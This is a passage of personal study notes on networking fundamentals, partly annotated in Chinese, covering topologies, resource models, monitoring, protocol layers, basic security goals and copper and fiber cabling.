◦ a business in Chicago had a location near O’Hare Airport, near the Navy Pier, in the Sears Tower.
◦ If a service provider could interconnect those locations using a high-speed network, such as a 10-Gbps (10 billion bits per second) network, the interconnection of those locations would constitute a MAN.
- One example of a MAN technology is Metro Ethernet.
PAN: personal-area network
- smaller than a LAN.
- Example:
◦ a connection between a PC and a digital camera via a universal serial bus (USB) cable.
◦ a PC connected to an external hard drive via a FireWire connection.
- is not necessarily a wired connection. - A Bluetooth connection between cell phone and car’s audio system: wireless PAN (WPAN).
- The main distinction of a PAN is typically limited to just a few meters. IEEE - Institute of Electrical and Electronics Engineers: internationally
recognized standards body.
Networks Topology
to classifying networks
- based on the geographical placement of their components,
- by the network’s topology.
Physical Versus Logical Topology
Just because a network appears to be a star topology (that is, where the network components all connect back to a centralized device, such as a switch), the traffic might be flowing in a circular pattern through all the network components attached to the centralized device.
traffic flow determines the logical topology
how components physically interconnected determines the physical topology.
The traffic flow: dictates how to classify a network’s logical topology.  Bus Topology
  - single collision domain - Early Ethernet networks commonly relied on bus topologies.
- Just One cable is used per network segment.
  - one cable running through the area requiring connectivity.
- To maintain appropriate electrical characteristics of the cable, the cable requires a terminator (of a specific resistance) at each end of the cable.
- Network components tap directly into the cable via a connector/ network tap like T connector (10BASE2 networks) or vampire tap (10BASE5 networks).
   -  - A bus and all devices connected to that bus is one network segment
网段. Benefits:
- Less cable required
- less expensive.
- easier Installation. Drawbacks:
- single cable per network segment, the cable is single point of failure.
  - error on one device can impact performance of other devices on the bus.
- Troubleshooting difficult
  - problem isolation might necessitate an inspection of multiple
network taps to make sure they either have a device connected or they are properly terminated. - does not scale well, all devices share the bandwidth available on the bus.
  - Adding devices may cause an outage for other users on the bus.
- two devices on the bus simultaneously request access to the bus, an error condition results.
Ring Topology
- Although the computers physically connect to a centralized MAU, the traffic flow actually loops flows in a circular fashion around a closed network loop (a ring).
- rarely seen in modern networks
- sends data, in single direction, connected each device in turn, until the intended destination.
- Logically relied on a ring topology, physically, star topology.
- Devices are interconnected by connecting to a single ring or in a dual ring.
- Each device on a ring includes both a receiver and a transmitter. repeats the signal it receives.
 Fiber Distributed Data Interface (FDDI), ring-based topology, have fiber optics as the media
- Most FDDI networks used not just one ring, but two, sent data in opposite directions, resulting in counter-rotating rings.
- benefit: if a fiber broke, the stations on each side of the break could interconnect their two rings, resulting in a single ring capable of reaching all stations on the ring.
Benefits:
- allows devices on the ring to take turns transmitting on the ring,
contention for media access was not a problem, as it was for a
 bus topology.
- A dual ring topology adds fault tolerance. a cable break,
connectivity to all devices could be restored.
- Troubleshooting is simplified:
  - each device on a ring contains a repeater.
  - When the repeater on the far side of a cable break doesn’t
receive any data within a certain amount of time, it reports an error condition (typically in the form of an indicator light on a network interface card NIC).
Drawbacks:
- single ring topology, single point of failure. broken at any point,
data would stop flowing.
- Rings have scalability limitations (maximum length and number
of attached stations). Once limits is exceeded, a single ring might need to be divided into two interconnected rings.
- A network maintenance window might need to be scheduled to perform this ring division.
- a ring must be a complete loop, the amount of cable required is higher than the cable required for a bus topology (serving the same number of devices).
Star Topology  a central point, Media Access Unit (MAU), from which all attached devices radiate 广播.
- centralized device: a hub in the early 1990s. a switch in modern networks.
- most popular physical LAN topology in use today
- independent connections back to a central device.
- unshielded twisted-pair cable (UTP) used to connect from the switch ports to clients.
- commonly used with Ethernet technologies. Benefits:
- A cable break only impacts that device, not the entire topology.
- simple Troubleshooting, central device is the aggregation point of
all the connected devices. Drawbacks:
- More cable is required, each device requires one to connect back to the central device.
- Installation take longer, more cable must be installed. Hub-and-Spoke Topology 轴辐式:
 - two spoke locations communicate via the hub location.
- interconnecting multiple sites/locations via WAN links, a WAN link from each remote site (spoke site) to the main site (hub site).
- With WAN links, a service provider is paid a recurring fee for each link.
  - helps minimize WAN expenses by not directly connecting any two spoke locations.
  - Each remote site (spoke) connects back to amain site (hub) via a WAN link.   - two remote sites Communication through the hub site. Benefits:
- Costs are reduced, minimal number of links are used.
- Adding additional sites easy, only needs to add one link per site. Drawbacks:
- Suboptimal routes must be used between remote sites, because all intersite communication must travel via the main site.
- hub site potentially becomes a single point of failure. lacks redundancy.
Full-Mesh Topology 全狀拓樸:
 directly connects every site to every other site.
Benefits:
- An optimal route exists between any two sites, not relaying traffic
via another site.
- highly fault tolerant. multiple links in the topology could be lost.
- Troubleshooting easy, each link is independent. Drawbacks:
- difficult and expensive to scale, one new site requires a new WAN link between the new site and every other existing site.
Partial-Mesh Topology 部分拓樸:
provide an optimal route between selected sites, not everyone.
- selected sites (sites with frequent intersite communication) are interconnected via direct links.
- sites with less frequent communication can communicate via another site.
- uses fewer links Benefits
- avoiding the expense of interconnecting every site to every other site.
- more redundant path than a hub-and-spoke topology. Drawbacks
- less fault tolerance than a full- mesh topology. - more expensive than a hub- and-spoke topology.
MPLS cloud
- each of your sites has a physical connection to your WAN provider rather than a connection to each of your other sites.
- full mesh, private-line network: hard to manage and cost a ton of
money.
- But inside your provider's network, the one that you have a
physical connection to, they provide a virtual full mesh network
  - each of your sites has a direct virtual connection to the other
sites.
  - trace an IP packet from one site to another, only going to be
one hop away in your network, even though it might take a physically divergent path on the carrier's network.
- Benefits: simpler implementation, decreased costs.
Non-Broadcast Multi-Access (NBMA): 非廣播式多重存取連線
- 預設上，訊框中繼網路在遠端設備之間提供 Non-Broadcast
Multi-Access, NBMA 的連線類型。
- NBMA 其實和一般的廣播網路環境(如乙太網路)類似, 差別只在
於所有的router都位於同樣子網路之中。
- 然而，因為成本的考量，NBMA 通常位於Hub-and-spoke的網路
拓樸之中。但是，在這樣的Hub-and-spoke的網路拓樸中， 同一個子網路中，每一個路由器並沒有專門的PVC分別連線 到不同的遠端路由器。
- 因為訊框中繼網路的非廣播式多重存取連線架構，讓訊框中繼 網路出現以下兩個問題:
1. 路由更新的到達性問題。
2. 當一個實體介面連接上多個永久性虛擬線路時，必須重複發送廣 播封包。
路由更新問題
- 在Distance Vector路由協定中，為了減少Routing Loop, 衍生出 Split Horizon的解決方案
- 但是在訊框中繼網路中，Split Horizon卻衍生出其他的問題.
- 在訊框中繼網路的Hub-and-spoke的網路架構中，Spoke會發送
路由更新給hub，而hub會透過同一個實體的介面來建立出很
   多不同條的永久性虛擬線路。
- 在這樣的環境中，一旦hub由這個實體介面收到廣播封包(也
就是路由更新), 卻不能轉發這個路由更新封包，透過同一 個介面轉發給其他不同Spoke，因此造成無法傳送路由更新 出去的問題。
- 當然，如果hub的每一個實體介面都只有建立一個PVC的話， 就不會有這種路由更新的問題。
重複發送廣播封包問題
- 這個問題的發生環境與上一個問題相同，但如果要解決上面這
個問題，就會衍生出現在這個問題。
- 就是因為主要的Headquarter端路由器會透過同一個實體的介面
來建立出很多不同條的永久性虛擬線路
- 所以一旦收到廣播封包，若打算把這樣的廣播封包真的傳送到
   不同的永久性虛擬線路，那麼這些廣播封就會耗盡大量的網
   路頻寬，而造成網路嚴重延遲的問題。
Network Topologies
The physical layout and organization of computers and networking devices is known as the network topology. The logical topology is the grouping of networked systems into trusted collectives. The physical topology is not always the same as the logical topol- ogy. There are four basic topologies of the physical layout of a network: ring, bus, star, and mesh.
478 Chapter 11 ■ Secure Network Architecture and Securing Network Components Ring Topology A ring topology connects each system as points on a circle (see Figure 11.9). The connection medium acts as a unidirectional transmission loop. Only one system can transmit data at a time. Traffic management is performed by a token. A token is a digital hall pass that travels around the ring until a system grabs it. A system in possession of the token can transmit data. Data and the token are transmitted to a specific destination. As the data travels around the loop, each system checks to see whether it is the intended recipient of the data. If not, it passes the token on. If so, it reads the data. Once the data is received, the token is released and returns to traveling around the loop until another system grabs it. If any one segment of the loop is broken, all communication around the loop ceases. Some implementations of ring topologies employ a fault tolerance mechanism, such as dual loops running in opposite directions, to prevent single points of failure.
Bus Topology A bus topology connects each system to a trunk or backbone cable. All systems on the bus can transmit data simultaneously, which can result in collisions. A collision occurs when two systems transmit data at the same time; the signals interfere with each other. To avoid this, the systems employ a collision avoidance mechanism that basically “listens” for any other currently occurring traffic. If traffic is heard, the system waits a few moments and listens again. If no traffic is heard, the system transmits its data. When data is transmitted on a bus topology, all systems on the network hear the data. If the data is not addressed to a specific system, that system just ignores the data. The benefit of a bus topology is that if a single segment fails, communications on all other segments continue uninterrupted. However, the central trunk line remains a single point of failure.  Cabling, Wireless, Topology, and Communications Technology 479 FIGURE 11.10 A linear bus topology and a tree bus topology Linear Tree
There are two types of bus topologies: linear and tree. A linear bus topology employs a single trunk line with all systems directly connected to it. A tree topology employs a single trunk line with branches that can support multiple systems. Figure 11.10 illustrates both types. The primary reason a bus is rarely if ever used today is that it must be terminated at both ends and any disconnection can take down the entire network.
Star Topology A star topology employs a centralized connection device. This device can be a simple hub or switch. Each system is connected to the central hub by a dedicated seg- ment (see Figure 11.11). If any one segment fails, the other segments can continue to func- tion. However, the central hub is a single point of failure. Generally, the star topology uses less cabling than other topologies and makes the identification of damaged cables easier.
A logical bus and a logical ring can be implemented as a physical star. Ethernet is a bus-based technology. It can be deployed as a physical star, but the hub or switch device is actually a logi- cal bus connection device. Likewise, Token Ring is a ring- based technology. It can be deployed as a physical star using a multistation access unit (MAU). An MAU allows for the cable seg- ments to be deployed as a star while internally the device makes logical ring connections.
Mesh Topology A mesh topology connects systems to other systems using numerous paths (see Figure 11.12). A full mesh topology connects each system to all other systems on the network. A partial mesh topology connects many systems to many other systems. Mesh topologies provide redundant connections to systems, allowing multiple segment failures without seriously affecting connectivity.
Networks Defined by Resource Location
- another way to categorize networks: where network resources reside? Client-Server Networks
- a collection of PCs all sharing files located on a centralized server.
- Client-server networks are commonly used by businesses.
- Client devices share a common set of resources (file or print resources)
located on different dedicated servers.
- resources are located on one or more servers.
- Resource sharing is made possible via dedicated server hardware and
network OSs.
Benefits
- easily scale,
- Backups can be simplified, fewer locations must be backed up.
- better performance than peer-to-peer network, resources can be
located on dedicated servers, rather than on a PC running a variety of end-user applications or administer network resources on multiple peer devices.
- administration is simplified, because parameters, such as file sharing permissions and other security settings, can be administered on a server as opposed to multiple clients.
Drawbacks
- Because multiple clients might rely on a single server for their
resources, single point of failure.
- can cost more than peer-to-peer networks. might require the purchase
of dedicated server hardware and a network OS with an appropriate number of licenses. extra expense of dedicated server resources.
NOTE
A server in a client-server network could be a computer running a network operating system (NOS),
- such as Novell NetWare or a variety of Microsoft Windows Server OSs.
A server might be a host making its file system available to remote clients via the Network File System (NFS) service, which was originally developed by Sun Microsystems.
A server in a client-server network could be Network-attached storage (NAS).
- a mass storage device that attaches directly to a network. Rather than running an advanced NOS,
- NAS device typically makes files available to network clients via a service such as NFS.
Peer-to-Peer Networks
- Peer-to-peer networks allow interconnected devices to share their resources with one another.
- Peer-to-peer networks are commonly seen in smaller businesses and in homes.
- Those resources could be files or printers.
- peers can share files on their own hard drives, and one of the peers has
a directly attached printer that can be shared with the other peers
in the network.
- The popularity of these peer-to-peer networks is fueled in part by
client operating systems which support file and print sharing.
- Client devices share their resources (file and printer resources) with
other client devices.
- Resource sharing is made available through the clients’ OSs.
Benefits
- installed easily, resource sharing is made possible by the clients’ OSs,
- knowledge of advanced NOSs is not required.
- cost less than client- server networks, no requirement for dedicated
server resources or advanced NOS software.
Drawbacks
- Scalability is limited, the increased administration burden of managing multiple clients. a network administrator might have to manage file permissions on multiple devices.
- Performance might be less than that seen in a client- server network, because the devices providing network resources might be performing other tasks not related to resource sharing (example, word processing).
Hybrid network.
Some networks have characteristics of both peer-to-peer and client-server networks.
- example, PCs in a company might all point to a centralized server for accessing a shared database in a client-server topology.
- However, these PCs might simultaneously share files and printers between one another in a peer-to-peer topology. monitor network
network interface has specific performance characteristics
- Bandwidth
  - how much data we can transmit in a period of time,
  - often measured in bits/second.
  - one gigabit ethernet connections on your servers shifting
towards 10 gigabit and even 40 gigabit in some cases. - latency.
  - how long it takes for data transfers to start and complete
  - most commonly measured in milliseconds.
  - crucial to the performance of your applications, it impacts
TCP and its core optimization's sliding window and congestion control.
- how much data are moving how fast.
  - IP/TCP were designed to move data over slow, unreliable
networks.
  - But today, most networks are very fast and likely very
reliable. to keep tabs on both bandwidth and latency.
  - some other hardware and OS level things need to keep track
- buffers
  - on both the network interface and kernel-level structures
  - finite capacity for holding incoming data.
- queues.
  - As data moves up the stack towards the application, there are
queues used in process space to hold data.
  - These can be much larger than the buffers available at both the hardware and kernel levels.
visualization of Linux network I/O.  - data comes into the network interface, placed into an internal buffer on the cart.
- It then interrupts the operating system, causing a process interrupt
- that data is passed up into the network stack inside the kernel.
  - The network stack then makes the forwarding decision about
the frame that it just received.
  - keep it or discard it?
- Once that's decided, the data is passed on into the socket queue
- when application is ready, it will read the data out of the socket
queue and use the data accordingly.
monitoring networks?
- are we saturating our network interface, moving data at interface's
capacity.
  - add a second/third interface or more
  - or increase the interface's bandwidth, upgrading from one gig
to 10 gig.
- latency.
  - data grams moving too slowly to destination?
  - to isolate where the cause of the latency is
  - often it isn't the server
  - but something on the network in between the two
systems that are trying to communicate.
  - just like disk I/O, if saturating a network interface, latency
will start to increase. But it's up to us to isolate where the issue is.   - high CPU utilization on a core/socket in system
  - isolate it down to what the cause is.
  - in iSCSI networks, moving block data over ethernet
connection on very high performance database systems, the encapsulating and de-encapsulating of those high throughput frames causes CPU to go up.
- queuing on an interface.
  - ensure that systems are receiving and processing the data in a
timely manner and that it's not queuing up in socket buffers or anywhere in a pipeline that we just discussed
- packet drops.
  - These can cause you significant grief, contributing to poor
performance, but impacting TCP's optimizations of
congestion control and sliding window.
  - Basically you'll wind up left with underutilized bandwidth on
your network connections if start dropping packets and probably data loss. 5.1 Network Security Concepts
5.1 Network Security Concepts
the Internet was designed so communication occurs through sequences of data packets.
A data packet is a finite-length set of bits, divided into two parts:
- a header: specifies where the packet is going and contains various
overhead and bookkeeping details.
- a payload, the actual information that is being communicated.
- When 2 entities communicate using the Internet,
  - they must chop their messages into packets,
  - attach a header on the front of each one,
  - have those packets find their way through the Internet to reach their respective destinations.
5.1.1 Network Topology
A network’s connection structure: network topology.
The computers in a network are host nodes that can be sources and destinations of messages, and the routers in the network are communication nodes through which messages flow.
The physical connections between nodes define the channels through which messages travel, packets move by being passed from one node to the next in order, from source node to destination node.
local area network/LAN: private network composed of computers in relatively close proximity to each other.
area network/WAN: the Internet, composed of many machines and smaller networks spread out over great distances.
In addition, the routers in wide-area networks on the Internet are partitioned into clusters, autonomous systems (ASs).
Each AS is controlled by a single organizational entity, which determines how packets will be routed among the nodes in that AS.
routing within an AS is done using shortest paths, so that the number of hops to route a packet from one node to another in this AS is minimized and routing cycles are avoided.
routing between multiple AS is determined by contractual agreements, but it is still designed to avoid loops.
5.1.2 Internet Protocol Layers
Before delving into the wide range of security issues the Internet creates, it is important to understand the underlying building blocks that comprise it.
The architecture of the Internet is modeled conceptually partition into layers, Internet protocol stack.
Each layer provides a set of services and functionality guarantees for higher layers
each layer does not depend on details or services from higher levels.
each layer provides to higher levels is designed to provide only the essential information from this layer that is needed by the higher levels
lower-level details are hidden from the higher levels. The exact number and names of the layers depending on what source we consider as authoritative.
Five Conceptual Layers for Internet Communication [TCP/ IP model]
1. Physical layer
  - move the actual bits between the nodes of the network, on a best
effort basis.
  - example, deals with whether connections are done with copper
wires, coaxial cables, optical-fiber cables, or wireless radio.
  - It provides to the next higher level an ability to transmit bits between a pair of network nodes.
2. Link layer.
  - transfer data between a pair of network nodes or between nodes in a local-area network and to detect errors that occur at the physical layer.
  - deals with the logical aspects of sending information across network links and how to find good routing paths in a local-area network.
  - It includes such protocols as Ethernet, which is used to route packets between computers sharing a common connection.
  - provides a grouping of bits into ordered records, frames.
  - uses 48-bit, media access control addresses (MAC addresses).
3. Network layer / Internet layer for the Internet   - move packets between any two hosts, on a best effort basis.
  - It provides a way of individually addressing each host using IP
address.
  - The main protocol provided by this layer: Internet Protocol (IP),
IPv4 32-bit, IPv6 128-bit.
  - Best effort basis means there are no guarantees that any given packet will be delivered. Thus, if reliable delivery is required by an application, it will have to be provided by a higher layer.
4. Transport layer.
  - support communication and connections between applications, based on IP addresses + ports, 16-bit addresses for application- level protocols to use.
  - The transport layer provides protocol:
  - Transmission Control Protocol (TCP): establishes a virtual connection between a client and server and guarantees delivery of all packets in an ordered fashion.
  - User Datagram Protocol (UDP): assumes no prior setup and delivers packets as quickly as possible but with no delivery guarantees.
The layered model used for the Internet Protocol Suite:
helps system designers to build software that uses appropriate services provides the right service guarantees,
without troubling with unnecessary implementation details.
example,
a web server transmitting content to a client’s web browser would probably do so using the HTTP application layer protocol.
The HTTP packet would most likely be encapsulated in the payload of a TCP
transport-layer packet.
In turn, the TCP packet would be contained in the payload of an IP packet, which in turn would be wrapped in an appropriate link-layer protocol such as Ethernet, to be transferred over a physical means of transmission.
  Open Systems Interconnection (OSI) model
7 layers:
application layer: divided into a strict application layer, for host application- to-network processes.
presentation layer: for data representation,
session layer: for interhost communication.
A packet for a given layer in this model consists of the data to be transmitted
plus metadata providing routing and control information.
The metadata is stored in the initial portion of the packet, header and The data portion of the packet is referred to as the payload.
For all but the topmost layer, the payload stores a packet of the layer
immediately above.
This nesting of packets is called encapsulation.
 IP Fragmentation and Reassembly 1.3 Network Security Issues
Connecting computers to a network, like the Internet, so they can exchange data and share computations allows for huge benefits to society. Indeed, it is hard to imagine what life today would be like without the Internet. But computer networking also allows for a number of attacks on computers and information. So let us revisit some of the principles of computer security, focusing now on how they are impacted by computer networking.
How Networking Impacts Computer Security Goals
- Confidentiality. There is no requirement, in any of the layering abstractions discussed above, that the contents of network packets be kept confidential. In fact, standard protocols for each layer don’t encrypt the contents of either their headers or their data. Thus, if net- work communications should be kept confidential, then encryption should be done explicitly. This encryption could either be done at the application layer (as in the HTTPS protocol) or by revising a lower- layer protocol to include encryption, such as in the IPsec specification.
- Integrity. The headers and footers that encapsulate data packets have, at each layer, simple checksums to validate the integrity of data and/or header contents. These checksums are effective at de- termining if a small number of bits have been altered, but they are not cryptographically secure, so they don’t provide integrity in the computer security sense. Thus, if true integrity is required, then this should also be done at the application layer or with alternative protocols at lower layers.
- Availability. The Internet was designed to tolerate failures of routers and hosts. But the sheer size of the Internet makes availability a challenge for any network object that needs to be available on a 24/7 basis. For instance, web servers can become unavailable because they become bombarded with data requests. Such requests could come from hoards of legitimate users suddenly interested in that web site or from an attack coming from many compromised hosts that is meant to create a denial of service for the web site. Thus, to achieve availability at the scale of the Internet, we need network applications that can scale with increases in communication requests and/or block attacks from illegitimate requests.
Assurance. As a default, a packet is allowed to travel between any source and destination in a network. Thus, if we want to introduce permissions and policies that control how data flows in a network, these have to be implemented as explicit additions. For instance, network firewalls are designed to block traffic in and out of a network domain if that traffic violates policies set by administrators.
- Authenticity. The headers and footers for the standard Internet pro- tocols do not have a place to put digital signatures. Indeed, in the Internet Protocol stack, there is no notion of user identities. Data is exchanged between machines and processes, not people. Thus, if we want to introduce identities and allow for signatures, then we must do so explicitly at the application layer or with an alternative protocol.
- Anonymity. Since there is no default notion of identity of users of the Internet, it has a built-in anonymity. This anonymity is probably a good thing for a human rights worker reporting on abuses, but it’s probably bad if it lets an identity thief steal credit card numbers with- out being caught. Attacks on anonymity can come from technologies that identify the computer a person is using. Likewise, people can replicate many copies of a process and place these copies at multiple hosts in the network, thus achieving a level of anonymity. Network Components
Media
- network is an interconnection of devices.
- Those interconnections occur over some type of media.
  - physical: like copper or fiber-optic cable
  - air: radio waves propagate (wireless networking
technologies)  Coaxial Cable / coax   - composed of two conductors: inner conductor vs metallic outer conductor
  - inner conductor is surrounded by another conductor (sometimes made of a metallic foil or woven wire)
- resistant to electromagnetic interference (EMI) 电磁干扰 / radio frequency interference (RFI).
  - external signal received on a wire might result a corrupted data transmission.
  - when a wire acts as an antenna and radiates electromagnetic waves, which might interfere with data transmission on another cable.
  - 同轴的 Coaxial cables have an associated characteristic impedance 阻抗, which needs to be balance with the device (or terminator) with which the cable connects.
- Three common types of coaxial cables: (RG: radio guide.)   - RG-59:
  - for short-distance applications (carrying composite video between two nearby devices.)
  - has loss characteristics, not for long-distance applications.
  - has a characteristic impedance of 75 Ohms. ◦ RG-6:
▸ Commonly used by local cable companies
▸ connect individual homes to the cable company’s
distribution network.
▸ has a characteristic impedance of 75 Ohms.
◦ RG-58:
▸ Has loss characteristics and distance limitations similar to those of RG-59.
▸ has a characteristic impedance of 50 Ohms,
▸ was popular with early 10BASE2 Ethernet networks
▸ Although RG-58 coaxial cable was commonplace in early
computer networks (in 10BASE2 networks), coaxial cable’s role in modern computer networks is as the media used by cable modems. Cable modems are commonly installed in residences to provide high-speed Internet access over the same connection used to receive mul- tiple television stations.
- Common connectors used on coaxial cables are as follows:
◦ Bayonet Neill-Concelman (BNC) / British Naval Connector:
▸ can be used for a variety of applications, including being used as a connector in a 10BASE2 Ethernet network.
◦ F-connector:
▸ frequently used for cable TV (including cable modem)
connections.
Twisted-Pair Cable  - most popular LAN media type
- individually insulated copper strands are intertwined into a twisted-
pair cable.
2 categories of twisted-pair cable: STP, UTP
- for adherence to fire codes: plenum cable, non-plenum cable.
TIA/EIA-568 standard:
- To define industry-standard pinouts and color coding for twisted- pair cabling
  - The first: TIA/EIA-568-A standard(1991)
  - In 2001, an updated standard TIA/EIA-568-B released.
  - the pinout of these two standards is the same. the color
coding of the wiring is different.
- TIA/EIA:TelecommunicationsIndustryAssociation/Electronic
Industries Alliance. Shielded Twisted Pair (STP) cable
- wires in a cable not twisted or shielded:
  - that cable can act as an antenna, might receive or transmit
EMI.
- To prevent this
  - the wires (individually insulated) twisted together in pairs.
  - If the distance between the twists is less than a quarter of the wavelength 波⻓ of an electromagnetic waveform,
  - the twisted pair of wires will not radiate that wavelength or receive EMI from that wavelength (the wires were perfect conductors).
- but frequencies increase, wavelengths decrease.
  - To support higher frequencies, surround a twisted pair in a
metallic shielding (similar the outer conductor in a coaxial
cable.)
  - This outer conductors shield the copper strands from EMI;
  - however, adds the expense of STP.
Unshielded Twisted Pair (UTP)
◦ Another way to block EMI from the copper strands is to twist the strands more tightly (that is, more twists per centimeters [cm]). wrapping these strands around each other, the wires insulate each other from EMI.
◦ less expensive than STP, grown quickly since mid 1990s, the most choice for LANs.
◦ UTP cable types vary in their data carrying capacity. Common categories of UTP cabling include the following:
▸ Category 3 (Cat 3) cable
- commonly used in Ethernet 10BASE-T networks,
- carry data at a rate of 10 Mbps (megabits per second, millions of
bits per second). - But, can carry data at a maximum rate of 16 Mbps, as seen in some Token Ring networks.
▸ Category 5: Category 5 (Cat 5) cable is
- commonly used in Ethernet 100BASE- TX networks,
- carry data at a rate of 100 Mbps.
- But, can carry ATM traffic at a rate of 155 Mbps.
- Most Cat 5 cables consist of four pairs of 24 gauge wires.
- Each pair is twisted, average every 5 cm. with a different number of
twists per meter,
▸ Category 5e (Cat 5e) extended cable
- an updated version of Cat 5
- commonly used for 1000BASE-T networks.
- carry data at a rate of 1 Gbps.
- offers reduced crosstalk, as compared to Cat 5 cable.
▸ Category 6 (Cat 6) cable
- is commonly used for 1000BASE-T Ethernet networks.
- Some Cat 6 cable is made of thicker conductors (example, 22 gauge
or 23 gauge wire),
- made from the same 24 gauge wire used by Cat 5 and Cat 5e. But
has thicker insulation and offers reduced crosstalk, as compared with Cat 5e.
▸ Category 6a (Cat 6a), or augmented Cat 6,
- supports twice as many frequencies as Cat 6
- be used for 10GBASE-T networks, which can transmit data at a rate
of 10 billion bits per second (10 Gbps).
◦ Most UTP cabling used in today’s networks is considered to be
straight-through, meaning that the RJ-45 jacks at each end of a cable have matching pinouts.
▸ example: pin 1 in an RJ-45 jack at one end of a cable uses the same copper conductor as pin 1
▸ in the RJ-45 jack at the other end of a cable.
◦ However, some network devices cannot be interconnected with
a straight-through cable.
▸ example, consider two PCs interconnected with a straight- (NIC) in these PCs use the same pair of wires for transmission and reception, when one PC sends data to the other PC, the receiving PC would receive the data on its transmission wires, rather than its reception wires.
▸ For such a scenario, you can use a crossover cable, which swaps the transmit and receive wire pairs between the two ends of a cable.
▸ A crossover cable for Ethernet devices vs digital T1 circuit.
▸ an Ethernet crossover cable has a pin mapping of 1 -> 3, 2 -> 6, 3 -> 1, and 6 -> 2,
▸ while a T1 crossover cable has a pin mapping of 1 -> 4, 2 ->5, 4 -> 1, and 5 ->2.
NOTE A traditional port found in a PC’s NIC is called a media- dependent interface (MDI). If a straight-through cable connects a PC’s MDI port to an Ethernet switch port, the Ethernet switch port needs to swap the transmit pair of wires (that is, the wires connected to pins 1 and 2) with the receive pair of wires (that is, the wires con- nected to pins 3 and 6).
Therefore, a traditional port found on an Ethernet switch is called a media-dependent interface crossover (MDIX), which reverses the transmit and receive pairs. However, if you want to interconnect two switches, where both switch ports used for the inter- connection were MDIX ports, the cable would need to be a crossover cable.
Fortunately, most modern Ethernet switches have ports that can automatically de- tect if they need to act as MDI ports or MDIX ports and make the appropriate adjustments. This eliminates the necessity of using straight-through cables for some Ethernet switch connections and crossover cables for other connections. With this Auto-MDIX feature, you can use either straight-through cables or crossover cables.
- Common connectors used on twisted-pair cables are as follows: ◦ RJ-45: type 45 registered jack ▸ However, most Ethernet implementations only use four of the eight pins.
◦ RJ-11:type 11 registered jack (RJ-11)
▸ has the capacity to be a six-pin connector.
▸ However, most RJ-11 connectors have only two or four
conductors.
▸ found mostly in home telephone networks. While most
home phones only use two of the six pins.
◦ DB-9 (RS-232):
▸ A 9-pin D-subminiature (DB-9) connector is commonly used as a connector for asynchronous 异步的 serial communications.
▸ One of the more popular uses of a DB-9 connector is to connect the serial port on a computer with an external modem.
Plenum Versus Non-Plenum Cable
- If a twisted-pair cable is to be installed under raised flooring or in an open-air return, fire codes must be considered.
◦ example: fire in a building, the outer insulation of a twisted-pair cable started to melt, release toxic fumes, those fumes could be spread throughout a building, posing a huge health risk.
- The outer insulator of a plenum twisted-pair cable is not only fire retardant; some plenum cabling uses a fluorinated ethylene polymer (FEP) or a low-smoke polyvinyl chloride (PVC) to minimize dangerous fumes. Fiber-Optic Cable
- An alternative to copper cabling is fiber-optic cabling
- sends light (instead of electricity) through an optical fiber (typically
made of glass).
◦ Using light instead of electricity, makes fiber optics immune to
EMI.
- Also, depending on the Layer 1 technology being used, fiber-optic
cables typically have greater range (that is, a greater maximum distance between networked devices) and greater data-carrying capacity.
- Lasers are often used to inject light pulses into a fiber-optic cable. However, lower- cost light emitting diodes (LED) are also on the market. Fiber-optic cables are generally classified according to their diameter and fall into one of two categories: multimode fiber (MMF) and single-mode fiber (SMF).
- The wavelengths of light also vary between MMF and SMF cables. Usually, wave- lengths of light in a MMF cable are in the range of 850–1300 nm, where nm stands for nanometers. A nanometer is one billionth of a meter. Conversely, the wavelengths of light in a SMF cable use usually in the range of 1310–1550 nm.
Multimode Fiber
- fiber-optic cables use two different types of glass.
◦ an inner strand of glass (core) surrounded by an outer cladding
of glass.
- The light injected by a laser (or LED) enters the core, and the light is prevented from leaving that inner strand and going into the outer cladding of glass. Specifically, the indices of refraction of these two different types of glass are so different that if the light attempts to leave the inner strand, it hits the outer cladding and bends back on itself.
- To better understand this concept, consider a straw in a glass of water. Because air and water have different indices of refraction (light travels at a slightly different speed in air and water), the light that bounces off of the straw and travels to our eyes is bent by the water’s index of refraction.
- When a fiber-optic cable is manufactured, dopants are injected into
the two types of glasses, making up the core and cladding to give them significantly different indices of refraction, thus causing any light attempting to escape to be bent back into the core.
- The path that light travels through a fiber-optic cable is called a mode of propagation. The diameter of the core in a multimode fiber is large enough to permit light to enter the core at different angles, as depicted in Figure 3-7.
- If light enters at a steep angle, it bounces back and forth much more frequently on its way to the far end of the cable as opposed to light that enters the cable perpendicularly. If pulses of light representing different bits might travel down the cable using different modes of propagation, it’s possible that the bits (that is, the pulses of light representing the bits) will arrive out of order at the far end (where the pulses of light, or absence of light, are interpreted as binary data by a photoelectric sensors).
- example
◦ the pulse of light
◦ first bit intersected the core at a steep angle: bounced back and
forth many times on its way to the far end of the cable,
◦ second bit intersected the core perpendicularly and did not
bound back and forth very much.
◦ the first bit has to travel further than the second bit, bits arrive
out of order.
◦ Such a condition is known as multimode delay distortion. To
mitigate the issue of multimode delay distortion, MMF typically has shorter distance limitations, as opposed to SMF.
Single-Mode Fiber (SMF)
- having a core with a diameter so small that it only permits one mode (one path) of propagation
- mitigated multimode delay distortion, SMF typically has longer distance limitations than MMF.
- A potential downside is cost. ◦ SMF has to be manufactured to very exacting tolerances, you usually pay more for a given length of fiber-optic cabling. for implementations greater distances are required, the cost is an acceptable trade-off to reach greater distances.
- Some common connectors used on fiber-optic cables are as follows:
◦ ST: straight tip (ST)/bayonet connector
▸ because of the long tip extending from the connector. ST
connectors are most commonly used with MMF.
▸ connects to terminating device by pushing the connector
into the equipment, twisting the connector housing to
lock it in place.
◦ SC: subscriber/standard/square connector.
▸ connected by pushing the connector into the terminating device, and it can be removed by pulling the connector from the terminating device.
◦ Lucent connector (LC):
▸ connects to a terminating device by pushing the connector
into the terminating device, it can be removed by pressing the tab on the connector and pulling it out of the terminating device.
◦ media termination recommended jack (MTRJ) :
▸ two fiber strands (a transmit strand and a receive strand) are included in a single connector.
▸ connected by pushing the connector into the terminating device, and it can be removed by pulling the connector from the terminating device.
Cable Distribution
- After deciding on what type of media you are going to use in your network(UTP, STP, MMF, or SMF)
- that media should be installed as part of an organized cable distribution system.
◦ wiring closets: cable from end-user offices run back to common locations in the building. ◦ Cables in these locations might terminate in a patch panel 接插
板. This patch panel might consist of some sort of cross- connect block wired into a series of ports (example, RJ-45
ports), which can be used to quickly interconnect cables coming from end-user offices with a network device, such as an Ethernet switch.
◦ A building might have multiple patch panels (like different floors).
◦ main distribution frame (MDF):
▸ the centralized distribution frame, connects out to multiple IDFs
◦ intermediate distribution frames (IDF): where cables from nearby offices terminate.
- The two most popular types of cross-connect blocks found in an IDF are as follows:
◦
66 block:
